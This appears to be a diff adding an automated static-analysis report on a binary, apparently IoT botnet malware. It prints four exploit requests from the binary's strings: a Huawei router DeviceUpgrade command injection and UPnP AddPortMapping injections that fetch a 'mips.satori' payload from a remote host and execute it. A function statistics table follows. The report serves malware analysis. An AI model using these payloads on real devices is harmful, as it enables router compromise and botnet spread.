@@ -1,0 +1,1613 @@
+=============================================================================
+========	BINARY ID :1a2695b56379bef4e53ee903eff9c8c4156a8646==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :239
+SUPSCPECTED LINES COUNT :10
+SUPSCPECTED STRINGS COUNT (DISTINCT) :10
+SUPSCPECTED STRINGS WEIGHT :39
+SUSPECT STRING SCORE : [39 / 150] 26%
+USER AGENTS STRINGS COUNT :3
+STATIC IPs STRINGS COUNT :0
+DYNAMIC IPs STRINGS COUNT :0
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+%29 HTTP/1.0\r\n\r\n
+ HTTP/1.0\r\n\r\n
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"\r\n\r\n<?xml version="1.0" ?>\r\n    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n    <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+/proc/stat
+/proc/cpuinfo
+processor
+/sys/devices/system/cpu
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/stat
+/proc/cpuinfo
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
+================================================================================
+========	FUNCTIONS SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES			: 46772
++++TOTAL FUNCTIONS 			:226
++++LINES PER FUNCTION RATIO 	: 206.955752212389
++++SUSPECTED LINES COUNT 	: 414
++++SUSPECTED LINES RATIO 	: 0.885144958522193
+================================================================================
+========	WHILES SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES				: 46772
++++WHILE (TRUE) LINES			: 12216
++++WHILE (TRUE) LINES RATION		:26.118190370307%
++++WHILE (TRUE) LOOPS COUNT		: 231
+================================================================================
+========	SYSTEM FILES SUMMARY : ================================================
+================================================================================
+                        function_b3e8(v173, (int32_t)"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n", 185);
+                                function_b3e8(v203, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v89);
+                        function_b3e8(v205, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", 185);
+                        function_b3e8(v228, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v89);
+================================================================================
+========	IP PATTERNS SUMMARY : =================================================
+================================================================================
+                        function_b3e8(v173, (int32_t)"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n", 185);
+
+================================================================================
+========	SYSTEM CALLS SUMMARY : ================================================
+================================================================================
+================================================================================
+========	FUNCTIONS LIST : =======================================================
+================================================================================
+FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
+----------------------------------------------------------------------------------------------
+function_ff08                                     |0   |2725    |80            |1055        |
+----------------------------------------------------------------------------------------------
+function_ec10                                     |7   |2309    |52            |1543        |
+----------------------------------------------------------------------------------------------
+function_e030                                     |0   |1229    |45            |975         |
+----------------------------------------------------------------------------------------------
+function_9b40                                     |2   |1458    |35            |321         |
+----------------------------------------------------------------------------------------------
+function_10a74                                    |1   |903     |25            |601         |
+----------------------------------------------------------------------------------------------
+function_fbb8                                     |1   |921     |24            |663         |
+----------------------------------------------------------------------------------------------
+function_107dc                                    |0   |717     |18            |494         |
+----------------------------------------------------------------------------------------------
+function_11198                                    |0   |2239    |16            |693         |
+----------------------------------------------------------------------------------------------
+function_870c                                     |1   |671     |9             |487         |
+----------------------------------------------------------------------------------------------
+function_8db0                                     |1   |402     |6             |91          |
+----------------------------------------------------------------------------------------------
+function_103e8                                    |0   |208     |5             |91          |
+----------------------------------------------------------------------------------------------
+function_9430                                     |1   |455     |5             |309         |
+----------------------------------------------------------------------------------------------
+function_e9c8                                     |0   |241     |5             |137         |
+----------------------------------------------------------------------------------------------
+function_c77c                                     |1   |2828    |5             |1436        |
+----------------------------------------------------------------------------------------------
+function_f814                                     |4   |459     |5             |348         |
+----------------------------------------------------------------------------------------------
+function_106c0                                    |3   |270     |4             |124         |
+----------------------------------------------------------------------------------------------
+function_1057c                                    |1   |289     |4             |134         |
+----------------------------------------------------------------------------------------------
+function_b4a8                                     |0   |450     |4             |212         |
+----------------------------------------------------------------------------------------------
+function_b5bc                                     |0   |508     |4             |228         |
+----------------------------------------------------------------------------------------------
+function_11610                                    |4   |189     |3             |71          |
+----------------------------------------------------------------------------------------------
+function_ac28                                     |3   |187     |3             |34          |
+----------------------------------------------------------------------------------------------
+function_12688                                    |2   |246     |3             |97          |
+----------------------------------------------------------------------------------------------
+function_ab70                                     |2   |246     |3             |90          |
+----------------------------------------------------------------------------------------------
+function_b420                                     |3   |198     |3             |67          |
+----------------------------------------------------------------------------------------------
+function_11520                                    |2   |217     |3             |100         |
+----------------------------------------------------------------------------------------------
+function_ad54_1                                   |2   |347     |3             |166         |
+----------------------------------------------------------------------------------------------
+function_b210                                     |10  |331     |2             |211         |
+----------------------------------------------------------------------------------------------
+function_d8c0                                     |0   |165     |2             |46          |
+----------------------------------------------------------------------------------------------
+function_e5cc                                     |1   |300     |2             |159         |
+----------------------------------------------------------------------------------------------
+function_12334                                    |3   |181     |2             |81          |
+----------------------------------------------------------------------------------------------
+function_110ac                                    |0   |264     |2             |98          |
+----------------------------------------------------------------------------------------------
+function_e940                                     |1   |193     |2             |91          |
+----------------------------------------------------------------------------------------------
+function_bff0                                     |3   |220     |2             |74          |
+----------------------------------------------------------------------------------------------
+function_11790                                    |2   |134     |2             |30          |
+----------------------------------------------------------------------------------------------
+function_82c0                                     |1   |166     |2             |61          |
+----------------------------------------------------------------------------------------------
+function_81d0                                     |1   |169     |2             |64          |
+----------------------------------------------------------------------------------------------
+function_d2a4                                     |0   |222     |2             |102         |
+----------------------------------------------------------------------------------------------
+function_be94                                     |1   |136     |1             |30          |
+----------------------------------------------------------------------------------------------
+function_f728                                     |1   |141     |1             |36          |
+----------------------------------------------------------------------------------------------
+function_d6d4                                     |0   |148     |1             |4           |
+----------------------------------------------------------------------------------------------
+function_11010                                    |0   |210     |1             |26          |
+----------------------------------------------------------------------------------------------
+function_98b8                                     |3   |129     |1             |24          |
+----------------------------------------------------------------------------------------------
+function_114a0                                    |2   |119     |1             |19          |
+----------------------------------------------------------------------------------------------
+function_f26c                                     |4   |129     |1             |14          |
+----------------------------------------------------------------------------------------------
+function_b0e4                                     |0   |197     |1             |17          |
+----------------------------------------------------------------------------------------------
+function_116fc                                    |0   |126     |1             |20          |
+----------------------------------------------------------------------------------------------
+function_eae8                                     |0   |123     |1             |27          |
+----------------------------------------------------------------------------------------------
+function_f1a0                                     |1   |115     |1             |16          |
+----------------------------------------------------------------------------------------------
+function_ae98                                     |3   |120     |1             |24          |
+----------------------------------------------------------------------------------------------
+function_12194                                    |4   |154     |1             |41          |
+----------------------------------------------------------------------------------------------
+function_11d40                                    |2   |197     |1             |59          |
+----------------------------------------------------------------------------------------------
+function_10f64                                    |3   |192     |1             |72          |
+----------------------------------------------------------------------------------------------
+function_9994                                     |2   |129     |1             |28          |
+----------------------------------------------------------------------------------------------
+function_83b4                                     |1   |118     |1             |15          |
+----------------------------------------------------------------------------------------------
+function_a988                                     |2   |184     |1             |71          |
+----------------------------------------------------------------------------------------------
+function_acf0                                     |4   |136     |1             |27          |
+----------------------------------------------------------------------------------------------
+function_8c44                                     |1   |167     |1             |62          |
+----------------------------------------------------------------------------------------------
+function_ba0c                                     |5   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f5b0                                     |2   |97      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1187c                                    |2   |386     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f078                                     |0   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_af48_2                                   |0   |110     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f0a4                                     |3   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c310                                     |0   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_9aa8                                     |2   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_124e4                                    |4   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_8c3c                                     |2   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c588                                     |2   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_114c0                                    |1   |167     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b8a0                                     |1   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_e7b0                                     |2   |157     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_9af8                                     |0   |109     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_e494                                     |1   |121     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_fb70                                     |1   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_11c20                                    |1   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c6bc                                     |2   |97      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_11fac                                    |1   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c0cc                                     |3   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_fb3c                                     |1   |110     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c184                                     |2   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b714                                     |3   |123     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c5cc                                     |2   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_11740                                    |4   |120     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c4d0                                     |2   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c354                                     |4   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_af40                                     |0   |105     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c1d0                                     |3   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10e24                                    |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c3c4                                     |0   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_125b8                                    |5   |121     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f12c                                     |1   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_e840                                     |2   |158     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b904                                     |0   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bb00                                     |1   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+entry_point                                       |2   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c34c                                     |2   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_9890                                     |1   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_8430                                     |3   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_11f4c                                    |2   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10338                                    |2   |114     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_e6f0                                     |1   |114     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f160                                     |4   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c288                                     |5   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_e4dc                                     |1   |228     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_fedc                                     |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_128a8                                    |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bfe0                                     |3   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_12150                                    |4   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_80d4                                     |0   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1200c                                    |1   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b700                                     |0   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bc3c                                     |2   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_1054c                                    |1   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_af48                                     |1   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f320                                     |0   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b8d8                                     |1   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_afd8                                     |2   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b918                                     |2   |105     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_12070                                    |0   |128     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c494                                     |0   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ba90                                     |1   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f3c4                                     |4   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f59c                                     |1   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ab24                                     |2   |107     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_eaac                                     |0   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f510                                     |3   |133     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b020                                     |4   |558     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_10e38                                    |1   |245     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_effc                                     |6   |116     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_aad8                                     |2   |128     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_80f0                                     |0   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b5a4                                     |2   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ab04                                     |3   |109     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c590                                     |3   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c280                                     |2   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_13b04                                    |0   |98      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b950                                     |2   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bf6c                                     |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bd20                                     |1   |134     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c1c8                                     |2   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c0d4                                     |4   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f150                                     |0   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_eaa0                                     |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_12064                                    |0   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f4a4                                     |1   |146     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d1f4                                     |2   |121     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_af0c                                     |0   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ebb8                                     |1   |112     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f208                                     |0   |114     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d1e0                                     |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_12440                                    |0   |189     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f348                                     |0   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f444                                     |2   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_e720                                     |1   |164     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d094                                     |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c4d8                                     |4   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c2d0                                     |2   |105     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_122dc                                    |3   |130     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c548                                     |5   |105     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d7fc                                     |1   |136     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bfd0                                     |0   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_117dc                                    |1   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b3e8                                     |3   |99      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_11800                                    |0   |105     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ab54                                     |3   |109     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_11f7c                                    |1   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c244                                     |3   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_e8d0                                     |1   |125     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_11d10                                    |1   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c704                                     |1   |109     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_83f0                                     |0   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_12410                                    |1   |97      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f334                                     |1   |96      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d7ec                                     |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bad0                                     |1   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f804                                     |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f67c                                     |2   |97      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_a960                                     |1   |95      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_93c8                                     |0   |98      |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bb40                                     |1   |125     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_f124                                     |1   |105     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bc50                                     |2   |124     |0             |0           |
+----------------------------------------------------------------------------------------------
